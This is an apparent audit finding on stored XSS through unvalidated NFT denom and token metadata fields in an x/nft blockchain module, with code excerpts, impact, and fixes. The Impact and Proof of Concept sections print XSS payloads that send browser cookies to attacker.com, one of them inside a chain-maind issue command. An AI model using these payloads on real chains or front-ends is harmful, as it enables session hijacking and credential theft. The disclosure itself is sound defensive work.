### Title
Unsanitized NFT Denom Name and NFT Data Fields Enable Stored XSS Injection into Front-End Displays - (`x/nft/types/validation.go`, `x/nft/types/msgs.go`)

---

### Summary

The `x/nft` module accepts and permanently stores user-controlled free-text fields — specifically the denom `name`, NFT `name`, NFT `data`, and denom `schema` — without any length cap or character-set restriction. Any block explorer, wallet, or NFT marketplace that queries and renders these fields without its own sanitization layer is exposed to stored cross-site scripting (XSS) via attacker-crafted NFT metadata.

---

### Finding Description

`ValidateDenomName` enforces only that the string is non-empty after trimming whitespace:

```go
// x/nft/types/validation.go
func ValidateDenomName(denomName string) error {
    denomName = strings.TrimSpace(denomName)
    if len(denomName) == 0 {
        return sdkerrors.Wrapf(ErrInvalidDenomName, "denom name(%s) can not be space", denomName)
    }
    return nil
}
``` [1](#0-0) 

There is no upper bound on length and no character-set filter. The `schema` and `uri` fields of `MsgIssueDenom` receive **no validation at all** in `ValidateBasic`:

```go
func (msg MsgIssueDenom) ValidateBasic() error {
    if err := ValidateDenomID(msg.Id); err != nil { return err }
    if _, err := sdk.AccAddressFromBech32(msg.Sender); err != nil { ... }
    return ValidateDenomName(msg.Name)
    // msg.Schema and msg.Uri are never checked
}
``` [2](#0-1) 

Similarly, `MsgMintNFT.ValidateBasic()` and `MsgEditNFT.ValidateBasic()` validate the token ID and URI length, but the `name` and `data` fields are never validated: [3](#0-2) [4](#0-3) 

`ValidateTokenURI` only enforces a 256-byte length cap with no character-set restriction, meaning a `javascript:` URI or an SVG-embedded `<script>` payload fits within the limit: [5](#0-4) 

By contrast, `ValidateDenomID` and `ValidateTokenID` are strict — they enforce `[a-z0-9]` only and a 3–64 byte length. The same discipline was never applied to the free-text display fields. [6](#0-5) 

---

### Impact Explanation

An attacker issues a denom (or mints an NFT) whose `name`, `data`, or `schema` field contains a payload such as:

```
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

or an SVG-embedded script. This string is stored permanently on-chain and returned verbatim by the gRPC/REST query endpoints. Any block explorer, wallet UI, or NFT marketplace that fetches denom/NFT metadata and renders it in an HTML context without its own sanitization will execute the attacker's JavaScript in the victim's browser. This enables session hijacking, wallet-signing prompt spoofing (e.g., a fake MetaMask popup), and credential theft against users of those front-end applications.

The corrupted value is the on-chain `Denom.Name` / `BaseNFT.Name` / `BaseNFT.Data` stored in the KV store, which is served to every downstream consumer of the chain's query API.

---

### Likelihood Explanation

The entry path requires only a standard `MsgIssueDenom` transaction signed by any account with sufficient fee balance — no privileged role is needed. The denom creator is the only prerequisite, and denom creation is permissionless. The payload is stored permanently and affects every front-end that queries the denom or NFT without independent sanitization. Block explorers and NFT marketplaces routinely render metadata fields directly.

---

### Recommendation

1. **Add a maximum length cap** to `ValidateDenomName` (e.g., 128 bytes, matching the spirit of `MaxDenomLen`).
2. **Add a character-set allowlist** to `ValidateDenomName` — at minimum reject `<`, `>`, `"`, `'`, `;`, and `/` characters, mirroring the recommendation in the Sablier report.
3. **Validate `name` and `data` in `MsgMintNFT.ValidateBasic()` and `MsgEditNFT.ValidateBasic()`** — currently these fields are entirely unchecked.
4. **Validate `schema` and `uri` in `MsgIssueDenom.ValidateBasic()`** — `schema` is completely unchecked; `uri` should additionally reject `javascript:` scheme prefixes.
5. Apply the same `[A-Za-z0-9 _\-]` allowlist approach used for `ValidateDenomID` to all human-readable display fields.

---

### Proof of Concept

```bash
# Any funded account can issue a denom with an XSS payload in the name
chain-maind tx nft issue \
  --denom-id "legitdenom" \
  --name '<img src=x onerror="fetch(\"https://attacker.com/\"+document.cookie)">' \
  --schema '{}' \
  --from attacker \
  --chain-id chain-main
```

The stored `Denom.Name` is then returned by:

```
GET /chainmain/nft/v1/denoms/legitdenom
```

Any front-end rendering `denom.name` as raw HTML executes the payload. The `data` and `schema` fields accept the same payloads via `MsgMintNFT` and `MsgEditNFT` with no additional barrier. [1](#0-0) [2](#0-1) [3](#0-2)
